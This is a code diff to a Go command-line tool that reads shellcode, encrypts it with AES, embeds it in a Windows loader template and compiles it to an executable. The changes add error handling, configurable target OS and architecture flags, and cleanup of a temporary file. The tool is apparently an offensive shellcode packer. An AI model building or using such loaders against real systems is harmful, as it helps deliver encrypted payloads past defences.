@@ -31,7 +31,11 @@ func GetParser(opts *Options) *cobra.Command {
             }
 
             fmt.Println("[+] Successfully read shellcode")
-            payload := loader.Encrypt(opts.AesKey, plaintext_payload)
+            payload, err := loader.Encrypt(opts.AesKey, plaintext_payload); if err != nil {
+                fmt.Println(err.Error())
+                os.Exit(1)
+            }
+
             s := loader.Shellcode{
                 Payload: payload,
                 Filename: opts.Outfile,
@@ -48,8 +52,8 @@ func GetParser(opts *Options) *cobra.Command {
             fmt.Println("[+] loaded Windows template")
 
             /* run compilation */
-            os.Setenv("GOOS", "windows")
-            os.Setenv("GOARCH", "386")
+            os.Setenv("GOOS", opts.OS)
+            os.Setenv("GOARCH", opts.arch)
             err = exec.Command(
                 "go",
                 "build",
@@ -63,14 +67,17 @@ func GetParser(opts *Options) *cobra.Command {
                 return
             }
             fmt.Println("[+] Successfully compiled shellcode")
+            os.Remove("tmp.go")
         },
     }
 
     defaults := GetDefaultCLIOptions()
 
-    cmd.PersistentFlags().StringVarP(&opts.Outfile, "outfile", "o", defaults.Outfile, "output filepath")
+    cmd.PersistentFlags().StringVarP(&opts.Outfile, "outfile", "f", defaults.Outfile, "output filepath")
     cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
     cmd.PersistentFlags().BytesHexVarP(&opts.AesKey, "aes-key", "a", defaults.AesKey, "AES key for shellcode encryption")
+    cmd.PersistentFlags().StringVarP(&opts.arch, "arch", "r", defaults.arch, "architecture compilation target")
+    cmd.PersistentFlags().StringVarP(&opts.OS, "os", "o", defaults.OS, "OS compilation target")
 
     return cmd
 }
